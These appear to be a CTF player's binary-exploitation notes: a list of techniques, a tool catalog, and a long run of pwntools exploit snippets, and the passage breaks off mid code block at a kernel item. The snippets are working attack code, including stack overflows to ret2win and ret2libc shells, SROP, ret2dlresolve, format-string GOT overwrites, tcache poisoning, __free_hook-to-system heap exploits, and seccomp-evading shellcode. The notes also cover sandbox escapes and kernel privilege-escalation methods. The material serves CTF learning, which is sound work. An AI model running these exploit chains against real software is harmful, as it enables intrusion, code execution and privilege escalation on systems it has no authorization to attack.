# Pwn Techniques — Binary Exploitation


> Mental model: the program trusts your input more than it should. You feed it input that overwrites something important (a return address, a pointer, a format) and steer the CPU to run what you want — usually a shell.

## A. Recon & setup

1. **checksec** — list protections (RELRO/canary/NX/PIE). *Scenario:* NX+PIE+canary tells you "no shellcode, need leaks, ROP."
2. **find the bug class** — read for gets/strcpy/scanf/printf misuse. *Scenario:* a `gets(buf)` is a guaranteed overflow.
3. **map the binary (pwntools ELF)** — symbols, GOT, PLT in Python. *Scenario:* you grab `elf.sym['win']` without hardcoding addresses.
4. **identify win function** — a function that reads the flag. *Scenario:* there's a `print_flag()` never called normally — your target.
5. **local vs remote parity** — match libc/arch to remote. *Scenario:* exploit works locally but not remote because libc differs; fix with the given libc.

## B. Finding the offset

6. **cyclic pattern** — unique sequence to locate the crash. *Scenario:* send `cyclic(200)`, crash, read the value in RIP to get the exact offset.
7. **cyclic_find** — convert crashed value to offset. *Scenario:* RIP=`0x6161616c` → offset 72.
8. **core-dump offset** — read the crash core. *Scenario:* no debugger handy; the core file shows where your bytes landed.
9. **manual stack math** — count buffer + saved rbp. *Scenario:* buffer[64] + 8 (rbp) = 72 to reach saved RIP.

## C. Classic stack

10. **stack buffer overflow** — write past a buffer. *Scenario:* 100 bytes into a 64-byte buffer smashes the return address.
11. **ret2win** — overwrite return addr with a win func. *Scenario:* jump straight to `print_flag()`.
12. **stack alignment (movaps) fix** — add a `ret` gadget. *Scenario:* exploit crashes in `system` on Ubuntu until you insert a bare `ret`.
13. **passing args on x64** — set rdi/rsi via gadgets. *Scenario:* `win(0xdeadbeef)` needs `pop rdi; ret` to load the arg.
14. **ret2shellcode** — jump to your shellcode (NX off). *Scenario:* executable stack; drop shellcode in the buffer and return to it.
15. **partial overwrite** — change only low bytes of an address. *Scenario:* with PIE, overwrite 1-2 bytes to hit a nearby function without a full leak.

## D. Shellcode

16. **pwntools shellcraft** — generate shellcode. *Scenario:* `shellcraft.amd64.linux.sh()` gives a ready `/bin/sh` payload.
17. **egg-hunter** — tiny stub finds the bigger payload. *Scenario:* only a few bytes fit at the jump; they search memory for the real shellcode.
18. **alphanumeric shellcode** — bytes survive a filter. *Scenario:* input must be printable; use an encoder to make shellcode printable.
19. **self-modifying/decoder stub** — payload decodes itself. *Scenario:* bad bytes (null/newline) banned; a decoder reconstructs them at runtime.
20. **syscall shellcode** — raw `execve` without libc. *Scenario:* static binary, no libc; call the syscall directly.

## E. ROP (return-oriented programming)

21. **ROP chaining** — stitch gadgets ending in `ret`. *Scenario:* NX blocks shellcode; you reuse existing code snippets to do the work.
22. **gadget hunting (ROPgadget/ropper)** — find useful snippets. *Scenario:* search for `pop rdi; ret` to control the first argument.
23. **ret2libc** — return into libc's `system("/bin/sh")`. *Scenario:* no win func; call libc's system with a `/bin/sh` string.
24. **GOT leak → libc base** — print a known GOT entry. *Scenario:* `puts(puts@got)` leaks its address; subtract offset for libc base.
25. **ret2csu** — generic gadget in `__libc_csu_init`. *Scenario:* you need 3 controlled args but lack gadgets; csu provides them.
26. **ret2dlresolve** — abuse the dynamic linker to resolve `system`. *Scenario:* no leak possible and no libc given; force the linker to resolve a symbol for you.
27. **stack pivot** — move rsp into controlled memory. *Scenario:* overflow too small for a full chain; pivot to a bigger buffer you control.
28. **SROP (sigreturn)** — fake a signal frame to set all registers. *Scenario:* almost no gadgets, but one `syscall; ret` + a `sigreturn` sets every register at once.
29. **ret2reg** — jump to an address already in a register. *Scenario:* a register points at your buffer; `jmp rsp`/`call rax` reaches it.
30. **one_gadget** — single libc address that execs a shell. *Scenario:* you control RIP once and the constraints hold; jump to the one-gadget for an instant shell.
31. **BROP (blind ROP)** — exploit with no binary, remote only. *Scenario:* a forking server leaks nothing; you brute gadgets by observing crashes vs hangs.
32. **JOP (jump-oriented)** — chains via indirect jumps. *Scenario:* `ret` gadgets scarce; build a dispatcher from jumps.

## F. Format string

33. **format string leak (%p)** — dump stack values. *Scenario:* `printf(user)` lets `%p %p %p` spill stack addresses, including a libc leak.
34. **targeted read (%s at offset)** — read a pointer's string. *Scenario:* `%7$s` reads whatever the 7th stack slot points to.
35. **arbitrary write (%n)** — write a number of printed chars. *Scenario:* `%n` writes to an address you placed on the stack.
36. **GOT overwrite via %n** — redirect a function. *Scenario:* overwrite `printf@got` with `system` so the next call spawns a shell.
37. **fmtstr_payload helper** — pwntools builds the write. *Scenario:* you give {addr: value}; pwntools crafts the nasty `%`-string.
38. **canary leak via format string** — read the cookie. *Scenario:* `%11$p` prints the canary so you can include it in an overflow.
39. **PIE/stack leak via format string** — defeat ASLR. *Scenario:* a stack or code pointer in the dump reveals the base.

## G. Protection bypasses

40. **canary leak + replace** — read it, write it back. *Scenario:* overflow would trip the canary; you leak it first, then keep it intact.
41. **canary brute (forking server)** — byte-by-byte. *Scenario:* a forking service keeps the same canary; brute one byte at a time (256 tries each).
42. **ASLR bypass with a leak** — compute base from leaked addr. *Scenario:* one leaked libc address fixes every libc offset.
43. **PIE bypass with a leak** — recover the binary base. *Scenario:* a leaked code pointer reveals where the binary loaded.
44. **partial RELRO GOT overwrite** — GOT still writable. *Scenario:* overwrite a GOT entry to hijack a call.
45. **full RELRO alternatives** — GOT read-only, use other targets. *Scenario:* overwrite `__free_hook`, a vtable, or `.fini_array` instead.
46. **NX → ROP** — can't run stack, reuse code. *Scenario:* NX on; you pivot entirely to ROP/ret2libc.
47. **brute low ASLR bits** — few random bits. *Scenario:* 32-bit or constrained ASLR; brute the handful of random bits.
48. **info leak primitive building** — turn any read into a leak. *Scenario:* an out-of-bounds read becomes your ASLR defeat.

## H. Heap — bugs

49. **heap overflow** — write past a heap chunk. *Scenario:* overflow a chunk into the next one's header/pointers.
50. **use-after-free (UAF)** — use a freed pointer. *Scenario:* freed object reused; you write new data the program treats as the old object.
51. **double free** — free the same chunk twice. *Scenario:* corrupt the freelist to make malloc return a chosen address.
52. **type confusion** — object used as the wrong type. *Scenario:* a freed buffer reallocated as a struct with a function pointer.
53. **off-by-one / null-byte overflow** — one byte past. *Scenario:* a single null byte shrinks a size field and triggers chunk overlap.

## I. Heap — techniques (glibc)

54. **tcache poisoning** — overwrite a freed chunk's fd. *Scenario:* next malloc of that size returns your arbitrary address.
55. **tcache dup** — double-free into tcache. *Scenario:* same chunk handed out twice; overlap for arbitrary write.
56. **safe-linking bypass (glibc≥2.32)** — fd pointers are XOR-obfuscated. *Scenario:* you leak a heap address to defeat the pointer masking.
57. **fastbin dup** — double-free in fastbins. *Scenario:* pre-tcache glibc; recycle a chunk to a controlled location.
58. **unsorted-bin leak** — a freed chunk holds a libc pointer. *Scenario:* read it to leak libc base (main_arena).
59. **unlink exploit** — forge chunk metadata. *Scenario:* corrupt fd/bk so unlink writes a pointer where you want.
60. **House of Force** — overwrite top chunk size. *Scenario:* huge malloc moves the top chunk onto a target to allocate there.
61. **House of Orange** — no free(), abuse top + FSOP. *Scenario:* only malloc available; trigger a free via top-chunk shrink, then hijack file streams.
62. **House of Spirit** — free a fake chunk. *Scenario:* trick malloc into returning memory you crafted on the stack.
63. **House of Einherjar** — off-by-one to backward-consolidate. *Scenario:* a null overflow merges chunks to overlap a target.
64. **House of Botcake** — tcache+unsorted combo. *Scenario:* modern glibc UAF turned into overlap for a strong write.
65. **tcache stashing unlink** — smallbin→tcache stash. *Scenario:* write a pointer to a target via the stashing path.
66. **__free_hook / __malloc_hook overwrite** — redirect allocator calls. *Scenario:* set `__free_hook = system`, free a chunk containing "/bin/sh".
67. **FSOP (file stream exploitation)** — fake `_IO_FILE`. *Scenario:* newer glibc without hooks; hijack the file vtable to get control.
68. **largebin attack** — corrupt largebin pointers. *Scenario:* write a large value to a target address during insertion.

## J. Integer & logic bugs

69. **integer overflow** — value wraps. *Scenario:* `len+1` wraps to 0, allocating a tiny buffer for huge data.
70. **signed/unsigned confusion** — negative treated as huge. *Scenario:* a `-1` length passes a `< max` check but becomes giant.
71. **off-by-one logic** — boundary mistake. *Scenario:* `<=` instead of `<` lets you write one element too far.
72. **array index OOB** — negative/large index. *Scenario:* index -1 reads/writes just before the array into metadata.
73. **uninitialized memory use** — stale data trusted. *Scenario:* an uninitialized pointer still holds a useful old value you control.
74. **race condition (TOCTOU)** — change between check and use. *Scenario:* swap a file/pointer in the tiny window after it's validated.

## K. Syscall/seccomp & sandboxes

75. **seccomp enumeration (seccomp-tools)** — list allowed syscalls. *Scenario:* `execve` blocked but `open/read/write` allowed → read the flag instead of a shell.
76. **open-read-write (ORW) shellcode** — exfil the flag without a shell. *Scenario:* seccomp jail; your shellcode opens the flag file and writes it to stdout.
77. **seccomp bypass via other arch** — switch to x86 from x64. *Scenario:* filter only covers x64 syscalls; flip to 32-bit to dodge it.
78. **shell escape / restricted shell** — break out of rbash. *Scenario:* limited shell; use an allowed program's shell feature to escape.
79. **Python sandbox escape** — reach os via dunders. *Scenario:* `().__class__.__bases__...` walks to `os.system`.

## L. Kernel pwn

80. **modprobe_path overwrite** — point it at your script. *Scenario:* trigger a bad binary exec; kernel runs your script as root.
81. **ret2usr** — return to user code (no SMEP). *Scenario:* kernel jumps to your userspace function that elevates privileges.
82. **SMEP/SMAP bypass** — ROP in kernel instead of ret2usr. *Scenario:* SMEP blocks user code; build a kernel ROP chain (e.g. disable it via CR4).
83. **KASLR leak** — leak a kernel pointer. *Scenario:* an info leak reveals the kernel base to fix offsets.
84. **KPTI handling (kpti_trampoline)** — return cleanly to user. *Scenario:* after LPE, use the trampoline to get back to userland without crashing.
85. **tty_struct / pipe_buffer exploitation** — hijack a kernel object's function pointer. *Scenario:* overwrite an ops pointer to run kernel code.
86. **userfaultfd / FUSE heap-spray** — pause kernel mid-operation. *Scenario:* win a race by freezing the kernel at the perfect moment.
87. **cred struct overwrite** — set uid=0. *Scenario:* zero out your process creds to become root.

## M. Automation & tooling

88. **pwntools tubes (process/remote)** — unified IO. *Scenario:* one script runs locally and against the remote by a flag.
89. **gdb.attach scripting** — auto-set breakpoints. *Scenario:* your exploit launches gdb with your breakpoints preloaded.
90. **libc-database / libc.rip** — ID libc from a leak. *Scenario:* leaked `puts` last 3 digits identify the exact libc to use.
91. **pwninit** — auto-patch binary to use given libc/ld. *Scenario:* one command sets up the challenge to run with its libc locally.
92. **angrop / automated ROP** — generate chains. *Scenario:* let a tool assemble the ROP chain for a standard goal.
93. **symbolic execution for pwn (angr)** — find the input/path. *Scenario:* reach a vulnerable branch that needs a specific magic input.
94. **fuzzing to find the bug (AFL++)** — auto-crash it. *Scenario:* you don't see the bug; the fuzzer finds a crashing input to analyze.
95. **flat()/payload builders** — compose payloads cleanly. *Scenario:* mix padding, gadgets, and values without manual `+` juggling.

## N. Strategy

96. **leak → compute → exploit** — the universal ASLR flow. *Scenario:* almost every modern pwn: get a leak, fix bases, then act.
97. **re-trigger via return-to-main** — loop the bug. *Scenario:* stage 1 leaks, return to main, stage 2 exploits with the leak.
98. **pick the easiest primitive** — don't over-engineer. *Scenario:* a direct ret2win exists; skip the heap rabbit hole.
99. **match remote exactly (Docker)** — reproduce their env. *Scenario:* run the provided Dockerfile so offsets match the server.
100. **save working stages** — keep leak/exploit modular. *Scenario:* remote is flaky; you re-run just the stage that failed.

## Sources
- ir0nstone binexp notes (stack, ROP, format string, heap, SROP, BROP)
- ljagiello/ctf-skills (ctf-pwn); InfoSec Institute binary-exploitation; shellphish how2heap

> Tags: #ctf #pwn #techniques


---

# Pwn Catalog — Binary Exploitation Tools & Scripts

Separate catalog from search. 100+ entries. Only use on challenge binaries / systems you're authorized to test. Format: **name** — purpose `source`.

## Core frameworks

1. **pwntools** — the exploit-dev library `pip install pwntools`
2. **pwninit** — auto-setup (patch libc, fetch ld) `github.com/io12/pwninit`
3. **pwndocker** — ready pwn env `github.com/skysider/pwndocker`
4. **zardus/ctf-tools** — installer scripts `github.com/zardus/ctf-tools`
5. **libc-database** — identify libc from leaks `github.com/niklasb/libc-database`
6. **libc.rip** — online libc search (API)
7. **libc.blukat.me** — online libc search

## GDB + plugins

8. **gdb** — base debugger `apt install gdb`
9. **pwndbg** — exploit-focused gdb `github.com/pwndbg/pwndbg`
10. **GEF** — gdb enhanced features `github.com/hugsy/gef`
11. **PEDA** — older (unmaintained)
12. **Pwngdb** — glibc heap helpers `github.com/scwuaptx/Pwngdb`
13. **splitmind / tmux** — gdb pane layout
14. **gdb-multiarch** — cross-arch `apt install gdb-multiarch`
15. **gdbserver** — remote debugging
16. **decomp2dbg** — decompiler context in gdb `github.com/mahaloz/decomp2dbg`
17. **gdb-pt-dump** — page tables (kernel)

## ROP / gadgets

18. **ROPgadget** — find gadgets `pip install ROPgadget`
19. **ropper** — gadget search + chains `pip install ropper`
20. **ropium** — ROP chain compiler `github.com/Boyan-MILANOV/ropium`
21. **angrop** — angr-based ROP `github.com/angr/angrop`
22. **pwntools ROP** — `ROP(elf)` auto-chains
23. **ret2dlresolve** — pwntools `Ret2dlresolvePayload`
24. **SROP** — pwntools `SigreturnFrame`
25. **one_gadget** — one-shot execve `/bin/sh` `gem install one_gadget`

## Binary inspection

26. **checksec** — RELRO/canary/NX/PIE (pwntools)
27. **pwntools ELF** — symbols/GOT/PLT in python
28. **readelf / objdump / nm** — binutils
29. **rabin2** — radare2 info
30. **patchelf** — set interpreter/rpath `apt install patchelf`
31. **ldd** — shared lib deps
32. **seccomp-tools** — dump seccomp filters `gem install seccomp-tools`
33. **ROPgadget --ropchain** — auto chain
34. **main_arena offset finder** — scripts
35. **elfutils / eu-*** — ELF utilities

## Heap

36. **how2heap** — Shellphish technique catalog `github.com/shellphish/how2heap`
37. **pwndbg heap cmds** — `heap`, `bins`, `vis_heap_chunks`
38. **GEF heap cmds** — `heap chunks`, `heap bins`
39. **libc-database (heap offsets)** — arena/tcache
40. **villoc** — visualize heap from trace `github.com/wapiflapi/villoc`
41. **heaptrace** — trace malloc/free `github.com/Arinerron/heaptrace`
42. **tcache poisoning scripts** — per-glibc
43. **house-of-* collection** — force, spirit, orange, einherjar, botcake...
44. **glibc source** — read malloc.c for your version
45. **ptmalloc visualizers** — misc

## Emulation / tracing

46. **qemu-user** — run foreign-arch bins `apt install qemu-user`
47. **qemu-system** — full-system (kernel pwn)
48. **Unicorn** — CPU emulation for harnessing `pip install unicorn`
49. **Qiling** — emulate + hook syscalls `pip install qiling`
50. **ltrace / strace** — call/syscall trace
51. **perf / ftrace** — kernel tracing

## Symbolic (for pwn)

52. **angr** — find paths/inputs `pip install angr`
53. **angrop** — ROP via angr
54. **manticore** — symbolic exec `pip install manticore`
55. **Triton** — taint + symbolic

## Fuzzing

56. **AFL++** — coverage-guided fuzzer `github.com/AFLplusplus/AFLplusplus`
57. **libFuzzer** — in-process fuzzing (LLVM)
58. **honggfuzz** — fuzzer `github.com/google/honggfuzz`
59. **boofuzz** — network protocol fuzzer `pip install boofuzz`
60. **radamsa** — mutation fuzzer `gitlab.com/akihe/radamsa`
61. **zzuf** — input fuzzer

## Shellcode

62. **pwntools shellcraft** — `shellcraft.amd64.linux.sh()`
63. **msfvenom** — Metasploit payload gen
64. **pwntools asm/disasm** — `asm()`, `disasm()`
65. **shell-storm shellcode db** — reference
66. **Exploit-DB shellcodes** — reference
67. **alphanumeric shellcode encoders** — misc

## Kernel pwn

68. **qemu + kernel image** — run target
69. **extract-vmlinux** — decompress kernel
70. **vmlinux-to-elf** — symbols from vmlinux `github.com/marin-m/vmlinux-to-elf`
71. **gdb + qemu `-s -S`** — kernel debug
72. **ROPgadget on vmlinux** — kernel gadgets
73. **kernelpop** — kernel exploit suggester
74. **modprobe_path / core_pattern** — common LPE targets
75. **ret2usr / KPTI / SMEP-SMAP notes** — techniques
76. **pt_regs / userfaultfd / FUSE** — heap-spray primitives
77. **kASLR leak helpers** — scripts

## Windows pwn (less common in DCTF)

78. **WinDbg + ext** — pykd, mona
79. **mona.py** — Immunity/WinDbg exploit helper
80. **Immunity Debugger** — win exploit dev
81. **ERC.Xdbg** — x64dbg exploit plugin
82. **rp++** — ROP gadget finder (PE/ELF/Mach-O)

## Automation / templates

83. **pwntools `context.binary`** — one-line setup
84. **pwntools `cyclic` / `cyclic_find`** — offsets
85. **pwntools `fmtstr_payload`** — format string writes
86. **pwntools `flat()`** — build payloads
87. **pwntools `gdb.debug/attach`** — scripted gdb
88. **pwntools `remote` / `process`** — IO
89. **pwntools `ssh`** — remote shell challenges
90. **pwntools `tube.interactive`** — drop to shell
91. **your pwn_template.py** — [[Scripts Index#Pwn — pwntools template]]
92. **your ret2libc.py** — [[Scripts Index#Pwn — ret2libc leak]]
93. **autorop / angrop auto** — automated chains
94. **Exploit skeleton generators** — misc repos

## Reference / learning

95. **ROP Emporium** — ROP challenge series `ropemporium.com`
96. **pwn.college** — structured pwn course `pwn.college`
97. **Nightmare** — pwn/RE course `guyinatuxedo.github.io`
98. **CTF Wiki (pwn)** — `ctf-wiki.org`
99. **Gray Hat Hacking** — book, exploit chapters
100. **shellphish/how2heap** — again, essential
101. **glibc malloc internals (sploitfun)** — articles
102. **Azeria Labs** — ARM exploitation
103. **smallest-exploit snippets** — misc gists
104. **pwntools write-ups repo** — examples `github.com/Gallopsled/pwntools-write-ups`

## Install quick ref (Debian/Ubuntu/WSL)

```bash
pip install pwntools ropper ROPgadget angr
sudo apt install -y gdb gdb-multiarch binutils strace ltrace qemu-user patchelf
gem install one_gadget seccomp-tools
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
```

## Sources

- ljagiello/ctf-skills (ctf-pwn); shellphish how2heap tools page
- pwndbg README; Gray Hat Hacking ch3; x-cmd pwndbg install

> Tags: #ctf #pwn #catalog


---

# Pwn Scripts (100)

pwntools snippets for binary exploitation. 🟢 easy / 🟡 medium / 🔴 hard. Use only on challenge binaries / systems you're allowed to test. `pip install pwntools`. Pairs with [[Pwn]], [[Pwn Techniques]], [[Pwn Catalog]].

```python
from pwn import *            # assumed at top of every snippet
context.arch='amd64'
```

---

## Setup / recon

🟢 1. load binary + context
```python
exe="./vuln"; elf=context.binary=ELF(exe)
```

🟢 2. checksec
```python
print(ELF("./vuln").checksec())   # or: checksec --file=./vuln
```

🟢 3. local process
```python
io=process("./vuln")
```

🟢 4. remote
```python
io=remote("host",1337)
```

🟢 5. local/remote switch by argv
```python
io = remote("host",1337) if args.REMOTE else process("./vuln")   # run: python x.py REMOTE
```

🟡 6. gdb.debug with breakpoints
```python
io=gdb.debug("./vuln","b *main\nc")
```

🟡 7. gdb.attach to running process
```python
io=process("./vuln"); gdb.attach(io,"b *0x401234\nc")
```

🟢 8. load libc
```python
libc=ELF("./libc.so.6")
```

🟢 9. cyclic pattern
```python
io.sendline(cyclic(200))
```

🟡 10. find offset from crashed RIP
```python
print(cyclic_find(0x6161616c))     # value you read in RIP
```

🟡 11. auto offset via corefile
```python
io=process("./vuln"); io.sendline(cyclic(300)); io.wait()
print(cyclic_find(io.corefile.read(io.corefile.rsp,8)))
```

🟢 12. symbols / addresses
```python
print(hex(elf.sym["win"]), hex(elf.got["puts"]), hex(elf.plt["puts"]))
```

---

## IO helpers

🟢 13. recv until prompt
```python
io.recvuntil(b"> ")
```

🟢 14. send line
```python
io.sendline(b"payload")
```

🟢 15. send after prompt (combined)
```python
io.sendlineafter(b"> ", payload)
```

🟢 16. recv a line / n bytes
```python
leak=io.recvline(); data=io.recvn(8)
```

🟢 17. drop to shell
```python
io.interactive()
```

🟡 18. parse a hex leak from text
```python
io.recvuntil(b"0x"); addr=int(io.recvline().strip(),16); print(hex(addr))
```

🟡 19. leak → u64 (right-pad)
```python
leak=u64(io.recvline().strip().ljust(8,b"\x00"))
```

🟡 20. leak 6-byte addr mid-line
```python
leak=u64(io.recv(6)+b"\x00\x00")
```

---

## Payload building

🟢 21. simple overflow
```python
payload=b"A"*72+p64(elf.sym["win"])
```

🟢 22. pack / unpack
```python
p64(0xdeadbeef); u64(b"\x08\x40"+b"\x00"*6)
```

🟢 23. flat() builder
```python
payload=flat({72:[elf.sym["win"]]})
```

🟡 24. fit() with placeholders
```python
payload=fit({0:b"A"*72, 72:p64(ret), 80:p64(elf.sym["win"])})
```

🟢 25. asm / disasm
```python
print(asm("mov rax,1")); print(disasm(b"\xb8\x01\x00\x00\x00"))
```

---

## Stack / ret2win

🟢 26. ret2win (no args)
```python
io.sendline(b"A"*72+p64(elf.sym["win"]))
```

🟡 27. stack alignment (movaps) fix
```python
ret=ROP(elf).find_gadget(["ret"])[0]
io.sendline(b"A"*72+p64(ret)+p64(elf.sym["win"]))
```

🟡 28. win with one arg (pop rdi)
```python
rop=ROP(elf); pop_rdi=rop.find_gadget(["pop rdi","ret"])[0]
io.sendline(b"A"*72+p64(pop_rdi)+p64(0xcafe)+p64(elf.sym["win"]))
```

🔴 29. three args via ret2csu
```python
rop=ROP(elf); rop.call(elf.sym["win"],[1,2,3]); io.sendline(b"A"*72+rop.chain())
```

🟡 30. partial overwrite (defeat PIE low bits)
```python
io.sendline(b"A"*72+p16(0x1234))   # overwrite only low 2 bytes of saved RIP
```

🟡 31. ret2shellcode (NX off, known buf addr)
```python
sc=asm(shellcraft.sh())
io.sendline(sc.ljust(72,b"\x90")+p64(buf_addr))
```

🟡 32. jmp rsp / jmp reg
```python
jmp=next(elf.search(asm("jmp rsp")))
io.sendline(b"A"*72+p64(jmp)+asm(shellcraft.sh()))
```

🔴 33. stack pivot (leave;ret)
```python
leave=ROP(elf).find_gadget(["leave","ret"])[0]
# set fake rbp to controlled buffer, chain lives there
```

🔴 34. stack migration (pop rbp + leave)
```python
pop_rbp=ROP(elf).find_gadget(["pop rbp","ret"])[0]
```

---

## ROP

🟢 35. auto ROP object
```python
rop=ROP(elf); print(rop.dump())
```

🟢 36. find common gadgets
```python
rop=ROP(elf)
pop_rdi=rop.find_gadget(["pop rdi","ret"])[0]
ret=rop.find_gadget(["ret"])[0]
```

🟡 37. find pop rsi/rdx (via ROPgadget)
```bash
ROPgadget --binary ./vuln | grep -E "pop rsi|pop rdx"
```

🟡 38. ropper gadget search
```bash
ropper -f ./vuln --search "pop rdi"
```

🔴 39. ret2libc stage 1 (leak puts@GOT)
```python
rop=ROP(elf); pop_rdi=rop.find_gadget(["pop rdi","ret"])[0]
p=b"A"*72+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(elf.sym["main"])
io.sendlineafter(b"> ",p)
libc.address=u64(io.recvline().strip().ljust(8,b"\x00"))-libc.sym["puts"]
```

🔴 40. ret2libc stage 2 (system /bin/sh)
```python
ret=rop.find_gadget(["ret"])[0]; sh=next(libc.search(b"/bin/sh\x00"))
p=b"A"*72+p64(ret)+p64(pop_rdi)+p64(sh)+p64(libc.sym["system"])
io.sendlineafter(b"> ",p); io.interactive()
```

🔴 41. one_gadget shell
```bash
one_gadget ./libc.so.6
```
```python
io.sendline(b"A"*72+p64(libc.address+0xe3b01))   # a constraint-satisfying offset
```

🔴 42. SROP (sigreturn)
```python
frame=SigreturnFrame()
frame.rax=59; frame.rdi=binsh; frame.rsi=0; frame.rdx=0; frame.rip=syscall_ret
io.sendline(b"A"*72+p64(syscall_ret)+bytes(frame))
```

🔴 43. ret2dlresolve (no libc)
```python
dl=Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
rop=ROP(elf); rop.read(0,dl.data_addr); rop.ret2dlresolve(dl)
io.sendline(fit({72:rop.chain(),rop.chain().__len__()+72:dl.payload}))
```

🔴 44. mprotect + shellcode (make stack exec)
```python
rop=ROP(elf); rop.mprotect(page,0x1000,7); rop.call(page)
```

🔴 45. execve via syscall ROP
```python
rop=ROP(elf); rop.execve(binsh,0,0); io.sendline(b"A"*72+rop.chain())
```

---

## Format string

🟡 46. leak stack with %p
```python
io.sendline(b"%p "*20)
```

🟡 47. auto-find fmt offset
```python
for i in range(1,30):
    io=process("./vuln"); io.sendline(f"AAAA%{i}$p".encode())
    if b"0x41414141" in io.recvall(timeout=1): print("offset",i); break
```

🟡 48. read string at arg N
```python
io.sendline(b"%7$s")
```

🔴 49. fmtstr_payload GOT overwrite
```python
payload=fmtstr_payload(6,{elf.got["exit"]:elf.sym["win"]})
io.sendline(payload)
```

🔴 50. fmtstr arbitrary write
```python
payload=fmtstr_payload(offset,{target_addr:value})
```

🟡 51. leak canary via fmt
```python
io.sendline(b"%11$p")   # find the slot that holds the canary (ends in 00)
```

🟡 52. leak libc via fmt (__libc_start_main)
```python
io.sendline(b"%p "*40)   # find a libc pointer, subtract known offset
```

🔴 53. overwrite printf GOT → system
```python
payload=fmtstr_payload(6,{elf.got["printf"]:libc.sym["system"]})
io.sendline(payload); io.sendline(b"/bin/sh")
```

---

## Libc / leak math

🟢 54. set libc base from a leak
```python
libc.address=leak-libc.sym["puts"]; print(hex(libc.address))
```

🟢 55. resolve system & /bin/sh
```python
system=libc.sym["system"]; binsh=next(libc.search(b"/bin/sh\x00"))
```

🟡 56. identify libc from leak (tool)
```bash
# libc.rip or: ./find puts <last 3 hex digits of leak>
```

🟡 57. libc-database local lookup
```bash
./libc-database/find puts 5c0 printf aa0
```

🟡 58. pwninit (auto patch to given libc)
```bash
pwninit            # fetches ld, patches ./vuln, writes solve template
```

---

## Heap

🟡 59. malloc/free menu wrapper
```python
def alloc(i,sz,data): io.sendlineafter(b">",b"1"); io.sendlineafter(b"idx",str(i).encode()); io.sendlineafter(b"size",str(sz).encode()); io.sendafter(b"data",data)
def free(i): io.sendlineafter(b">",b"2"); io.sendlineafter(b"idx",str(i).encode())
```

🔴 60. tcache poisoning (glibc<2.32)
```python
alloc(0,0x20,b"A"); free(0)
# overwrite freed chunk fd with target; next two mallocs → target
edit(0,p64(target)); alloc(1,0x20,b"x"); alloc(2,0x20,p64(value))
```

🔴 61. safe-linking unmask/mask (glibc>=2.32)
```python
mask=lambda pos,ptr:(pos>>12)^ptr
unmask=lambda v: (lambda p: p^ (p>>12) ^ ((p>>12)>>12))(v)  # iterate; simpler: reveal via leak
```

🔴 62. double free → tcache dup
```python
alloc(0,0x20,b"A"); free(0); free(0)   # needs no tcache-key or UAF edit
```

🔴 63. UAF overwrite function pointer
```python
free(0); alloc(1,0x20,p64(win))   # reuse freed obj, set its fptr
```

🔴 64. unsorted-bin libc leak
```python
alloc(0,0x90,b"A"); alloc(1,0x20,b"B"); free(0)
# read back chunk0 → main_arena ptr; libc.address = leak - offset
```

🔴 65. fastbin dup (glibc<2.26)
```python
alloc(0,0x60,b"A"); alloc(1,0x60,b"B"); free(0); free(1); free(0)
```

🔴 66. __free_hook → system
```python
edit(tcache_chunk,p64(libc.sym["__free_hook"]))
alloc(x,0x20,b"/bin/sh\x00"); alloc(y,0x20,p64(libc.sym["system"])); free(x)
```

🔴 67. __malloc_hook → one_gadget
```python
# tcache/fastbin into __malloc_hook-0x23 (size alignment trick), write one_gadget
```

🔴 68. house of force (old)
```python
# overwrite top chunk size with -1, malloc huge to move top to target
```

🟡 69. view heap in gdb (pwndbg)
```
pwndbg> heap
pwndbg> bins
pwndbg> vis_heap_chunks
```

🟡 70. find chunk overlap / tcache keys
```
pwndbg> tcachebins
```

---

## Shellcode

🟢 71. /bin/sh shellcode
```python
sc=asm(shellcraft.amd64.linux.sh())
```

🟡 72. ORW shellcode (seccomp-jailed, no execve)
```python
sc=asm(shellcraft.amd64.linux.cat("/flag") if False else
       shellcraft.amd64.linux.open("/flag")+shellcraft.amd64.linux.read(3,'rsp',100)+shellcraft.amd64.linux.write(1,'rsp',100))
```

🟡 73. dump seccomp filter
```bash
seccomp-tools dump ./vuln
```

🔴 74. egg-hunter / staged
```python
# small first-stage reads a bigger second stage into rwx, jumps to it
```

🔴 75. alphanumeric shellcode
```python
sc=asm(shellcraft.sh()); enc=encoders.encode(sc,avoid=bytes(range(0x30))+...)  # or use ae64/alpha3
```

---

## Integer / logic

🟡 76. trigger integer overflow size
```python
io.sendlineafter(b"size",str(0xffffffff).encode())   # wraps to tiny alloc
```

🟡 77. negative index write
```python
io.sendlineafter(b"idx",b"-1")   # reach metadata before array
```

🟡 78. signed length bypass
```python
io.sendlineafter(b"len",b"-1")   # passes < max, becomes huge unsigned
```

---

## Automation / glue

🟢 79. run with env/aslr off (local debug)
```python
io=process("./vuln",env={}); 
# disable ASLR system-wide: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

🟡 80. match remote with Docker
```bash
docker run --rm -it -v $PWD:/x ubuntu:20.04   # same libc as remote
```

🟡 81. exploit retry loop (flaky remote / brute)
```python
while True:
    try:
        io=remote("host",1337); exploit(io)
        r=io.recvall(timeout=2)
        if b"flag{" in r: print(r); break
    except EOFError: pass
    finally: io.close()
```

🟡 82. ssh challenge
```python
s=ssh("user","host",password="pw"); io=s.process("./vuln")
```

🟡 83. send raw bytes file as stdin
```python
io=process("./vuln"); io.send(open("payload.bin","rb").read())
```

🟢 84. context log level
```python
context.log_level="debug"    # see all IO; set "info" when stable
```

🟡 85. pack list of gadgets
```python
chain=b"".join(p64(x) for x in [pop_rdi,binsh,ret,system])
```

🟡 86. search string in binary/libc
```python
print(next(elf.search(b"/bin/sh"))); print(next(libc.search(b"sh\x00")))
```

🟡 87. dump GOT/PLT quickly
```bash
objdump -R ./vuln ; objdump -d -j .plt ./vuln
```

🟡 88. find writable memory (bss)
```python
bss=elf.bss(0x100); print(hex(bss))
```

🟡 89. rop to read into bss then pivot
```python
rop=ROP(elf); rop.read(0,bss,0x100); rop.migrate(bss)
```

🟡 90. one-liner cyclic in shell
```bash
python3 -c "from pwn import *; print(cyclic(100).decode())"
```

---

## Kernel / advanced (templates)

🔴 91. kernel: run challenge
```bash
./run.sh    # usually qemu-system; add -s to gdb-attach on :1234
```

🔴 92. kernel: debug with gdb
```bash
gdb vmlinux -ex "target remote :1234"
```

🔴 93. kernel: modprobe_path overwrite (concept)
```c
